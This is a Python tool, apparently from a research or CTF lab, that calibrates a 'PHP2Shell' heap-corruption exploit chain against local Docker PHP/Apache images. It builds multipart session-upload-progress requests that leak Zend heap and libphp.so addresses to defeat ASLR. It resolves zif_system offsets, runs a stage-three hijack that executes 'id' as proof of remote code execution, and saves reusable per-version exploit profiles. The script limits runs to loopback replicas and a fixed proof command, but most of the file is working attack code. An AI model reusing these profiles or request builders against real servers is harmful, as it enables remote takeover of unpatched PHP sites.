#!/usr/bin/env python3
"""Calibrate PHP2Shell against a local Docker PHP/Apache image.

The upstream exploit supplies the memory-corruption primitive. This tool adds
the build-adaptive layer:

1. start an isolated, one-worker Apache mod_php replica of a chosen image;
2. fingerprint PHP, the SAPI, the architecture and the distribution;
3. extract zif_system/zval_ptr_dtor offsets directly from libphp.so;
4. calibrate the heap parameters needed by the two disclosure stages;
5. attempt the known stage-3 layouts and verify a fixed `id` proof;
6. write a reusable JSON profile containing offsets and heap parameters.

Calibration is local-only and intentionally accepts no arbitrary command.
"""

from __future__ import annotations

import argparse
import hashlib
import importlib.util
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "solver"))

from bootstrap_upstream import EXPECTED_COMMIT, prepare


ROOT = Path(__file__).resolve().parent.parent
SOLVER = ROOT / "solver"
VENDOR = SOLVER / "vendor" / "php2shell-upstream"
UPSTREAM = VENDOR / "exploit.py"
PROFILE_DIR = SOLVER / "profiles"
WORK_DIR = ROOT / "runtime" / "research-work"

WEBROOT = ROOT / "challenge" / "lab" / "html"
PHP_INI = ROOT / "challenge" / "lab" / "php2shell.ini"
APACHE_CONF = ROOT / "challenge" / "lab" / "apache" / "php2shell.conf"

LIBPHP_PATHS = (
    "/usr/lib/apache2/modules/libphp.so",
    "/usr/local/apache2/modules/libphp.so",
)

# Official fixes for branches still supported at disclosure time. Older PHP
# branches are vulnerable and have no upstream-project fix in this map.
FIXED_PATCH = {
    "8.2": 35,
    "8.3": 36,
    "8.4": 27,
    "8.5": 12,
}

# One representative latest patch release for every vulnerable branch for which
# an official php:-apache image existed. `--image` accepts any other replica.
VERIFIED_MATRIX = [
    ("php:8.4.25-apache", "linux/arm64"),
    ("php:8.4.26-apache", "linux/amd64"),
    ("php:8.5.10-apache", "linux/arm64"),
    ("php:8.5.11-apache", "linux/arm64"),
    ("php:8.5.11-apache", "linux/amd64"),
]

HISTORICAL_MATRIX = [
    ("php:7.4-apache", "linux/arm64"),
    ("php:8.0-apache", "linux/arm64"),
    ("php:8.1-apache", "linux/arm64"),
    ("php:8.2.0-apache", "linux/arm64"),
    ("php:8.2.34-apache", "linux/arm64"),
    ("php:8.3.0-apache", "linux/arm64"),
    ("wordpress:7.1.1-apache", "linux/arm64"),
    ("php:8.3.35-apache", "linux/arm64"),
    ("php:8.5.0-apache", "linux/arm64"),
]

BRANCH_MATRIX = [
    ("php:5.4.45-apache", "linux/amd64"),
    ("php:5.5.38-apache", "linux/amd64"),
    ("php:5.6.40-apache", "linux/amd64"),
    ("php:7.0.33-apache", "linux/amd64"),
    ("php:7.1.33-apache", "linux/amd64"),
    ("php:7.2.34-apache", "linux/amd64"),
    ("php:7.3.33-apache", "linux/amd64"),
    ("php:7.4.33-apache", "linux/amd64"),
    ("php:8.0.30-apache", "linux/amd64"),
    ("php:8.1.34-apache", "linux/amd64"),
    ("php:8.2.34-apache", "linux/amd64"),
    ("php:8.3.35-apache", "linux/amd64"),
    ("php:8.4.26-apache", "linux/amd64"),
    ("php:8.5.11-apache", "linux/amd64"),
]

# Known-good hints reduce destructive calibration requests. Unknown builds use
# the search paths below instead of assuming that these values are universal.
SEEDS = {
    ("8.3.33", "aarch64"): {
        "stage1_n": 815,
        "stage1_forge_len": 63,
        "stage2_t": 406,
        "stage2_v": 16,
    },
    ("8.3.35", "aarch64"): {
        "stage1_n": 841,
        "stage1_forge_len": 63,
        "stage2_t": 406,
        "stage2_v": 16,
    },
    ("8.5.0", "aarch64"): {
        "stage1_n": 841,
        "stage1_forge_len": 63,
        "stage2_t": 406,
        "stage2_v": 16,
    },
    ("8.4.25", "aarch64"): {
        "stage1_n": 841,
        "stage1_forge_len": 63,
        "stage2_t": 406,
        "stage2_v": 16,
        "stage3_htdata": 0x690D8,
        "stage3_pads": "bookworm",
    },
    ("8.4.26", "amd64"): {
        "stage1_n": 841,
        "stage1_forge_len": 79,
        "stage2_t": 406,
        "stage2_v": 16,
        "stage3_htdata": 0x690D8,
        "stage3_pads": "bookworm",
    },
    ("8.5.10", "aarch64"): {
        "stage1_n": 841,
        "stage1_forge_len": 63,
        "stage2_t": 406,
        "stage2_v": 16,
        "stage3_htdata": 0x690D8,
        "stage3_pads": "bookworm",
    },
    ("8.5.11", "aarch64"): {
        "stage1_n": 841,
        "stage1_forge_len": 63,
        "stage2_t": 406,
        "stage2_v": 16,
        "stage3_htdata": 0x690D8,
        "stage3_pads": "bookworm",
    },
    ("8.5.11", "amd64"): {
        "stage1_n": 841,
        "stage1_forge_len": 63,
        "stage2_t": 406,
        "stage2_v": 16,
        "stage3_htdata": 0x690D8,
        "stage3_pads": "bookworm",
    },
}

FORGE_LENGTHS = (63, 79, 87, 95)
STAGE2_T_RANGE = range(350, 461)
STAGE2_VALUE_LENGTHS = (16, 8, 24, 32)
STAGE3_OFFSETS = (0x690D8, 0x6E0D8, 0x5404A)
STAGE3_PAD_STYLES = ("bookworm", "lab")
UPLOAD_PROGRESS_NAME = "progress_meter_challenge_id"


def info(message: str) -> None:
    print(message, flush=True)


def fail(message: str) -> None:
    raise RuntimeError(message)


def docker(*args: str, timeout: float = 900) -> subprocess.CompletedProcess[str]:
    try:
        return subprocess.run(
            ["docker", *args],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout,
        )
    except FileNotFoundError as exc:
        fail(f"Docker is required for local image calibration: {exc}")
    except subprocess.TimeoutExpired as exc:
        fail(f"docker {' '.join(args)} timed out: {exc}")
    raise AssertionError


def must_docker(*args: str, timeout: float = 900) -> str:
    result = docker(*args, timeout=timeout)
    if result.returncode != 0:
        fail(f"docker {' '.join(args)} failed: {result.stderr.strip()}")
    return result.stdout.strip()


def free_loopback_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def fetch_text(url: str, timeout: float = 5.0) -> str:
    try:
        with urllib.request.urlopen(url, timeout=timeout) as response:
            if response.status != 200:
                fail(f"{url} returned HTTP {response.status}")
            return response.read().decode("utf-8", "replace")
    except RuntimeError:
        raise
    except Exception as exc:
        fail(f"cannot fetch {url}: {exc}")
    raise AssertionError


def parse_kv(body: str) -> dict[str, str]:
    result: dict[str, str] = {}
    for line in body.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            result[key] = value
    return result


def wait_for_target(url: str, timeout: float = 60.0) -> dict[str, str]:
    deadline = time.monotonic() + timeout
    last_error = ""
    version_url = url.rstrip("/") + "/version.php"
    if "/index.php/" in version_url:
        version_url = version_url.replace("/index.php/", "/")
    while time.monotonic() < deadline:
        try:
            return parse_kv(fetch_text(version_url, timeout=2))
        except RuntimeError as exc:
            last_error = str(exc)
            time.sleep(0.5)
    fail(f"target did not become ready: {last_error}")
    raise AssertionError


def image_arch(image: str) -> str:
    arch = must_docker("image", "inspect", image, "--format", "{{.Architecture}}")
    return {"x86_64": "amd64", "arm64": "aarch64"}.get(arch, arch)


def image_digest(image: str) -> str:
    # Images pulled through an explicit platform sometimes lack RepoDigests on
    # the local tag. The image ID is still an immutable local-build identity.
    digest = must_docker(
        "image", "inspect", image, "--format",
        "{{if .RepoDigests}}{{index .RepoDigests 0}}{{else}}{{.Id}}{{end}}",
    )
    return digest or "local-image"


def pull_if_needed(image: str, platform: str | None = None) -> None:
    # Pull explicitly when a platform is requested: a tag such as php:8.5.11
    # may already resolve locally to amd64 while this calibration needs arm64.
    if platform:
        info(f"[*] pulling {image} for {platform}")
        must_docker("pull", "--platform", platform, image)
        return
    result = docker("image", "inspect", image)
    if result.returncode == 0:
        return
    info(f"[*] pulling {image}")
    must_docker("pull", image)


class EphemeralLab:
    """A disposable local replica with the exact challenge SAPI settings."""

    def __init__(self, image: str, platform: str | None) -> None:
        self.image = image
        self.platform = platform
        self.port = free_loopback_port()
        self.name = "p2s-cal-" + hashlib.sha1(image.encode()).hexdigest()[:12]
        self.target = f"http://127.0.0.1:{self.port}/index.php"
        self.out_dir = WORK_DIR / re.sub(r"[^A-Za-z0-9_.-]+", "_", image)
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.out_dir.chmod(0o1777)

    def start(self) -> dict[str, str]:
        docker("rm", "-f", self.name, timeout=30)
        command = ["run", "-d", "--name", self.name]
        if self.platform:
            command += ["--platform", self.platform]
        command += [
            "-p", f"127.0.0.1:{self.port}:80",
            "-v", f"{WEBROOT}:/var/www/html:ro",
            "-v", f"{PHP_INI}:/usr/local/etc/php/conf.d/zz-php2shell.ini:ro",
            "-v", f"{APACHE_CONF}:/etc/apache2/conf-enabled/zz-php2shell.conf:ro",
            "-v", f"{self.out_dir}:/out",
            self.image,
        ]
        info(f"[*] starting {self.image} at {self.target}")
        must_docker(*command)
        try:
            return wait_for_target(self.target)
        except RuntimeError:
            logs = docker("logs", self.name, timeout=30)
            info("[!] container startup logs:\n" + (logs.stdout + logs.stderr).strip()[-4000:])
            raise

    def exec(self, command: str) -> str:
        result = docker("exec", self.name, "sh", "-c", command, timeout=60)
        return result.stdout if result.returncode == 0 else ""

    def distro(self) -> str:
        body = self.exec(". /etc/os-release 2>/dev/null; echo $VERSION_CODENAME")
        value = body.strip().lower()
        return value or "unknown"

    def worker_count(self) -> int | None:
        body = self.exec("ps -eo comm= | grep -c '^apache2$'")
        return int(body.strip()) - 1 if body.strip().isdigit() else None

    def stop(self) -> None:
        docker("rm", "-f", self.name, timeout=30)


def parse_libphp_symbols(path: Path) -> tuple[int, dict[str, int]]:
    """Parse ELF64 symbol tables without requiring binutils in the image."""
    data = path.read_bytes()
    if data[:6] != b"\x7fELF\x02\x01":
        fail("libphp.so is not a little-endian ELF64 shared object")

    phoff, = struct.unpack_from("<Q", data, 0x20)
    shoff, = struct.unpack_from("<Q", data, 0x28)
    phentsize, phnum = struct.unpack_from("<HH", data, 0x36)
    shentsize, shnum = struct.unpack_from("<HH", data, 0x3A)

    loads: list[int] = []
    for index in range(phnum):
        offset = phoff + index * phentsize
        p_type, = struct.unpack_from("<I", data, offset)
        p_vaddr, = struct.unpack_from("<Q", data, offset + 16)
        p_memsz, = struct.unpack_from("<Q", data, offset + 40)
        if p_type == 1 and p_memsz:
            loads.append(p_vaddr)
    if not loads:
        fail("libphp.so has no PT_LOAD segment")
    bias = min(loads)

    sections: list[dict[str, int]] = []
    for index in range(shnum):
        offset = shoff + index * shentsize
        sh_name, sh_type = struct.unpack_from("<II", data, offset)
        sh_offset, sh_size = struct.unpack_from("<QQ", data, offset + 24)
        sh_link, = struct.unpack_from("<I", data, offset + 40)
        sh_entsize, = struct.unpack_from("<Q", data, offset + 56)
        sections.append({
            "name": sh_name,
            "type": sh_type,
            "offset": sh_offset,
            "size": sh_size,
            "link": sh_link,
            "entsize": sh_entsize,
        })

    wanted = {"zif_system": None, "zval_ptr_dtor": None}
    for section in sections:
        if section["type"] not in (2, 11):
            continue
        if section["link"] >= len(sections):
            continue
        strings = sections[section["link"]]
        entsize = section["entsize"] or 24
        for index in range(section["size"] // entsize):
            offset = section["offset"] + index * entsize
            st_name, = struct.unpack_from("<I", data, offset)
            st_value, = struct.unpack_from("<Q", data, offset + 8)
            if not st_name:
                continue
            name_offset = strings["offset"] + st_name
            end = data.find(b"\0", name_offset)
            if end < 0:
                continue
            name = data[name_offset:end].decode("ascii", "replace")
            if name in wanted and wanted[name] is None:
                wanted[name] = st_value

    missing = [name for name, value in wanted.items() if value is None]
    if missing:
        fail("symbols missing from libphp.so: " + ", ".join(missing))
    return bias, {name: value - bias for name, value in wanted.items()}


def copy_libphp(container: str) -> tuple[Path, str, dict[str, int]]:
    with tempfile.TemporaryDirectory(prefix="p2s-libphp-") as temporary:
        for source in LIBPHP_PATHS:
            destination = Path(temporary) / Path(source).name
            result = docker("cp", f"{container}:{source}", str(destination))
            if result.returncode == 0:
                bias, symbols = parse_libphp_symbols(destination)
                digest = hashlib.sha256(destination.read_bytes()).hexdigest()
                return Path(source), digest, symbols
    fail("libphp.so not found in the image")
    raise AssertionError


def load_upstream_module():
    prepare(VENDOR)
    commit = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=VENDOR,
        check=True,
        stdout=subprocess.PIPE,
        text=True,
    ).stdout.strip()
    if commit != EXPECTED_COMMIT:
        fail(f"upstream commit mismatch: {commit}")

    spec = importlib.util.spec_from_file_location("p2s_upstream", UPSTREAM)
    if spec is None or spec.loader is None:
        fail(f"cannot import upstream primitive: {UPSTREAM}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def cookie_from_response(response: bytes) -> bytes:
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", response)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Recover the Zend MM chunk base from the stage-1 pointer cluster."""
    if len(raw) < 1000:
        return 0
    counters: Counter[int] = Counter()
    for offset in range(len(raw) - 8):
        value = int.from_bytes(raw[offset:offset + 8], "little")
        if 0x10000 < value < 0x0001000000000000:
            counters[value & ~0x1FFFFF] += 1
    if not counters:
        return 0
    base, count = counters.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, destructor_offset: int) -> int:
    """Turn a leaked zval_ptr_dtor pointer into the libphp.so load base."""
    if len(raw) < 16:
        return 0
    pointer = int.from_bytes(raw[8:16], "little")
    if not 0x10000 < pointer < 0x0001000000000000:
        return 0
    if pointer & 0xFFF != destructor_offset & 0xFFF:
        return 0
    base = pointer - destructor_offset
    return base if base & 0xFFF == 0 else 0


def stage_one_request(module, exploit, count: int, forge_length: int) -> bytes:
    """Create the stale-state condition and forge the first HashTable page."""
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\0"},
        {"name": UPLOAD_PROGRESS_NAME, "data": b"pwn"},
        exploit._file_part(),
        exploit._big_field(),
    ]
    exploit.t.post(
        module.build_multipart(parts, b"S" * 17),
        b"S" * 17,
        read_cap=1 << 20,
        timeout=90,
    )
    time.sleep(0.2)

    parts = [
        {"name": "PHPSESSID", "data": module.SID},
        {"name": UPLOAD_PROGRESS_NAME, "data": b"pwn"},
    ]
    for index in range(count):
        value = (f"v{index:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + index), "data": value.encode()})
    forge = bytearray(b"A" * forge_length)
    if forge_length >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return exploit.t.post(
        module.build_multipart(parts, b"B" * 10),
        b"B" * 10,
        read_cap=9 << 20,
        timeout=90,
    )


def stage_two_request(module, exploit, target_index: int, value_length: int) -> bytes:
    """Place a 56-byte HashTable page over the stale PS(id) state."""
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\0"},
        {"name": UPLOAD_PROGRESS_NAME, "data": b"pwn"},
        exploit._file_part(),
        exploit._big_field(),
    ]
    exploit.t.post(
        module.build_multipart(parts, b"S" * 17),
        b"S" * 17,
        read_cap=1 << 20,
        timeout=90,
    )
    time.sleep(0.2)

    parts = [
        {"name": "PHPSESSID", "data": module.SID},
        {"name": UPLOAD_PROGRESS_NAME, "data": b"pwn"},
    ]
    for index in range(983):
        repeat = 16 if index == target_index else 1
        for subindex in range(repeat):
            parts.append({
                "name": f"a{index:04d}[{subindex}]",
                "data": b"x" * value_length,
            })
    return exploit.t.post(
        module.build_multipart(parts, b"B" * 10),
        b"B" * 10,
        read_cap=1 << 20,
        timeout=90,
    )


def calibrate_stage_one(module, exploit, hints: dict) -> tuple[int, int, int]:
    known_count = hints.get("stage1_n")
    known_length = hints.get("stage1_forge_len")
    if known_count and known_length:
        exploit.rotate()
        raw = cookie_from_response(stage_one_request(module, exploit, known_count, known_length))
        base = chunk_base_from_cookie(raw)
        info(f"[*] stage1 hint n={known_count} len={known_length}: cookie={len(raw)} base=0x{base:x}")
        return base, int(known_count), int(known_length)

    exploit.rotate()
    probe = cookie_from_response(stage_one_request(module, exploit, 900, 48))
    match = re.search(rb"v(\d{4})", probe)
    if not match:
        info("[!] stage1 probe did not disclose the stale-block index")
        return 0, 0, 0
    count = int(match.group(1))
    info(f"[*] stage1 stale block index: {count}")

    for length in FORGE_LENGTHS:
        exploit.rotate()
        raw = cookie_from_response(stage_one_request(module, exploit, count, length))
        base = chunk_base_from_cookie(raw)
        info(f"[*] stage1 n={count} len={length}: cookie={len(raw)} base=0x{base:x}")
        if base:
            return base, count, length
    return 0, count, 0


def calibrate_stage_two(
    module,
    exploit,
    destructor_offset: int,
    hints: dict,
) -> tuple[int, int, int]:
    target_candidates = [hints["stage2_t"]] if hints.get("stage2_t") else STAGE2_T_RANGE
    value_candidates = [hints["stage2_v"]] if hints.get("stage2_v") else STAGE2_VALUE_LENGTHS

    for target_index in target_candidates:
        for value_length in value_candidates:
            exploit.rotate()
            raw = cookie_from_response(stage_two_request(module, exploit, target_index, value_length))
            base = libphp_base_from_cookie(raw, destructor_offset)
            if base:
                info(f"[*] stage2 t={target_index} v={value_length}: libphp=0x{base:x}")
                return base, target_index, value_length
    return 0, int(hints.get("stage2_t", 0)), int(hints.get("stage2_v", 0))


def configure_stage_three(exploit, style: str) -> None:
    if style == "bookworm":
        exploit.stage3_carrier = True
        exploit.stage3_pads = [(31, 31)] * 6
    else:
        exploit.stage3_carrier = False
        exploit.stage3_pads = [(8, 7)] + [(7, 7)] * 5


def calibrate_stage_three(
    exploit,
    heap_base: int,
    libphp_base: int,
    zif_offset: int,
    proof: Path,
    hints: dict,
) -> tuple[bool, int | None, str | None]:
    layouts: list[tuple[str, int, str]] = []
    if hints.get("stage3_htdata"):
        layouts.append((
            "hint",
            int(hints["stage3_htdata"]),
            hints.get("stage3_pads", "bookworm"),
        ))
    else:
        layouts.extend(
            (f"0x{offset:x}/{style}", offset, style)
            for offset in STAGE3_OFFSETS
            for style in STAGE3_PAD_STYLES
        )

    for name, offset, style in layouts:
        try:
            proof.unlink()
        except FileNotFoundError:
            pass
        configure_stage_three(exploit, style)
        try:
            exploit.rotate()
            exploit.stage3(heap_base + offset, libphp_base + zif_offset)
        except Exception as exc:
            info(f"[*] stage3 {name}: request error {exc}")
        if proof.is_file() and proof.stat().st_size > 0:
            info(f"[+] stage3 {name}: fixed proof received")
            return True, offset, style
        info(f"[*] stage3 {name}: no proof")
    return False, None, None


def version_is_patched(version: str) -> bool:
    parts = version.split(".")
    if len(parts) != 3 or not all(part.isdigit() for part in parts):
        fail(f"invalid PHP version from fingerprint: {version!r}")
    branch = ".".join(parts[:2])
    fixed = FIXED_PATCH.get(branch)
    return bool(fixed and int(parts[2]) >= fixed)


def calibrate_image(image: str, platform: str | None, args) -> Path:
    if shutil.which("docker") is None:
        fail("Docker is required because calibration runs local replicas only")

    pull_if_needed(image, platform)
    architecture = image_arch(image)
    if platform and architecture != {"linux/amd64": "amd64", "linux/arm64": "aarch64"}.get(platform):
        fail(f"requested {platform} but local tag resolved to {architecture}")
    digest = image_digest(image)
    lab = EphemeralLab(image, platform)
    proof = lab.out_dir / "p1"

    try:
        fingerprint = lab.start()
        version = fingerprint.get("PHP_VERSION", "")
        sapi = fingerprint.get("PHP_SAPI", "")
        if not version:
            fail(f"cannot fingerprint PHP at {lab.target}")
        if sapi != "apache2handler":
            fail(f"this adapter requires Apache mod_php, observed SAPI={sapi!r}")
        if version_is_patched(version):
            fail(f"PHP {version} is fixed; refusing calibration")

        info(f"[*] image={image} php={version} arch={architecture} distro={lab.distro()}")
        libphp_path, libphp_sha256, symbols = copy_libphp(lab.name)
        info(
            f"[*] {libphp_path}: zif_system=0x{symbols['zif_system']:x} "
            f"zval_ptr_dtor=0x{symbols['zval_ptr_dtor']:x}"
        )

        module = load_upstream_module()
        target = module.Target(lab.target, timeout=60, verbose=False)
        exploit = module.Exploit(
            target,
            "id>/out/p1",
            zif_offset=symbols["zif_system"],
            dtor_offset=symbols["zval_ptr_dtor"],
            htdata_offset=STAGE3_OFFSETS[0],
            huge_mb=12,
            verbose=False,
            profile="bookworm",
        )

        hints = dict(SEEDS.get((version, architecture), {}))
        for key in (
            "stage1_n", "stage1_forge_len", "stage2_t",
            "stage2_v", "stage3_htdata", "stage3_pads",
        ):
            value = getattr(args, key)
            if value is not None:
                hints[key] = value

        heap_base, stage1_n, stage1_len = calibrate_stage_one(module, exploit, hints)
        libphp_base, stage2_t, stage2_v = calibrate_stage_two(
            module, exploit, symbols["zval_ptr_dtor"], hints
        )
        # Do not store candidate hints as calibrated values when disclosure
        # failed. A zero value makes the profile unambiguous for tooling and
        # prevents a future runner from mistaking a seed for a measurement.
        stage1_calibrated = int(stage1_n) if heap_base else 0
        stage1_len_calibrated = int(stage1_len) if heap_base else 0
        stage2_t_calibrated = int(stage2_t) if libphp_base else 0
        stage2_v_calibrated = int(stage2_v) if libphp_base else 0

        rce = False
        stage3_offset = None
        stage3_style = None
        if heap_base and libphp_base:
            rce, stage3_offset, stage3_style = calibrate_stage_three(
                exploit, heap_base, libphp_base, symbols["zif_system"], proof, hints
            )

        profile = {
            "schema_version": 2,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "scope": "local-calibration",
            "image": image,
            "image_digest": digest,
            "php_version": version,
            "branch": ".".join(version.split(".")[:2]),
            "fixed_in": (
                f"{'.'.join(version.split('.')[:2])}.{FIXED_PATCH['.'.join(version.split('.')[:2])]}"
                if ".".join(version.split(".")[:2]) in FIXED_PATCH else None
            ),
            "arch": architecture,
            "distro": lab.distro(),
            "sapi": sapi,
            "upstream_commit": EXPECTED_COMMIT,
            "libphp_path": str(libphp_path),
            "libphp_sha256": libphp_sha256,
            "libphp": {
                "zif_system": f"0x{symbols['zif_system']:x}",
                "zval_ptr_dtor": f"0x{symbols['zval_ptr_dtor']:x}",
                "htdata": f"0x{stage3_offset:x}" if stage3_offset is not None else None,
            },
            "stages": {
                "stage1_n": stage1_calibrated,
                "stage1_forge_len": stage1_len_calibrated,
                "stage2_t": stage2_t_calibrated,
                "stage2_v": stage2_v_calibrated,
                "stage3_pads": (
                    [(31, 31)] * 6 if stage3_style == "bookworm"
                    else ([(8, 7)] + [(7, 7)] * 5 if stage3_style == "lab" else None)
                ),
                "stage3_carrier": stage3_style == "bookworm" if stage3_style else None,
            },
            "measured": {
                "zend_chunk_base": f"0x{heap_base:x}" if heap_base else None,
                "libphp_base": f"0x{libphp_base:x}" if libphp_base else None,
            },
            "config": {
                "memory_limit": fingerprint.get("MEMORY_LIMIT"),
                "session_upload_progress": fingerprint.get("SESSION_UPLOAD_PROGRESS"),
                "workers": lab.worker_count(),
            },
            "verified": rce,
            "rce": rce,
            "status": (
                "RCE verified with runtime ASLR bases" if rce else
                "leaks calibrated; stage 3 not verified" if heap_base and libphp_base else
                "calibration failed before complete ASLR disclosure"
            ),
        }

        PROFILE_DIR.mkdir(parents=True, exist_ok=True)
        output = PROFILE_DIR / f"{version}-{architecture}-{lab.distro()}.json"
        if output.exists() and not getattr(args, "force", False):
            try:
                previous = json.loads(output.read_text(encoding="utf-8"))
            except (OSError, json.JSONDecodeError):
                previous = {}
            if previous.get("rce") is True and profile.get("rce") is not True:
                fail(
                    "refusing to overwrite an existing verified RCE profile with "
                    f"an unverified result; use --force: {output}"
                )

        output.write_text(json.dumps(profile, indent=2) + "\n", encoding="utf-8")
        info(f"[*] profile written: {output}")
        info(f"[*] status={profile['status']} heap=0x{heap_base:x} libphp=0x{libphp_base:x}")
        return output
    finally:
        lab.stop()


def parse_int(text: str) -> int:
    return int(text, 0)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Calibrate a local PHP Docker image for the PHP2Shell ASLR chain",
    )
    images = parser.add_mutually_exclusive_group(required=True)
    images.add_argument("--image", help="PHP Apache image, for example php:8.5.11-apache")
    images.add_argument("--all", action="store_true", help="calibrate the representative vulnerable-branch matrix")
    images.add_argument(
        "--matrix",
        choices=("verified", "branches", "historical", "full"),
        help="calibrate a named matrix; verified is much smaller than --all",
    )
    images.add_argument("--list-matrix", action="store_true", help="show the default matrix and exit")
    parser.add_argument("--platform", help="Docker platform, for example linux/amd64")
    parser.add_argument("--force", action="store_true", help="allow overwrite of a verified RCE profile")
    parser.add_argument("--stage1-n", type=int)
    parser.add_argument("--stage1-forge-len", dest="stage1_forge_len", type=int)
    parser.add_argument("--stage2-t", type=int)
    parser.add_argument("--stage2-v", type=int)
    parser.add_argument("--stage3-htdata", dest="stage3_htdata", type=parse_int)
    parser.add_argument("--stage3-pads", choices=STAGE3_PAD_STYLES)
    args = parser.parse_args()

    if args.list_matrix:
        for image, platform in [*VERIFIED_MATRIX, *BRANCH_MATRIX, *HISTORICAL_MATRIX]:
            print(f"{image}\t{platform or 'host'}")
        return 0

    if args.all and args.matrix:
        parser.error("--all and --matrix are mutually exclusive")
    if args.all or args.matrix == "branches":
        selected_matrix = BRANCH_MATRIX
    elif args.matrix == "verified":
        selected_matrix = VERIFIED_MATRIX
    elif args.matrix == "historical":
        selected_matrix = HISTORICAL_MATRIX
    elif args.matrix == "full":
        selected_matrix = [*VERIFIED_MATRIX, *BRANCH_MATRIX, *HISTORICAL_MATRIX]
    else:
        selected_matrix = []

    targets = selected_matrix or [(args.image, args.platform)]
    failures: list[str] = []
    for image, matrix_platform in targets:
        try:
            calibrate_image(image, matrix_platform or args.platform, args)
        except RuntimeError as exc:
            failures.append(f"{image}: {exc}")
            info(f"[!] {image}: {exc}")
    if failures:
        print("\n".join(failures), file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
    except RuntimeError as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        raise SystemExit(1)
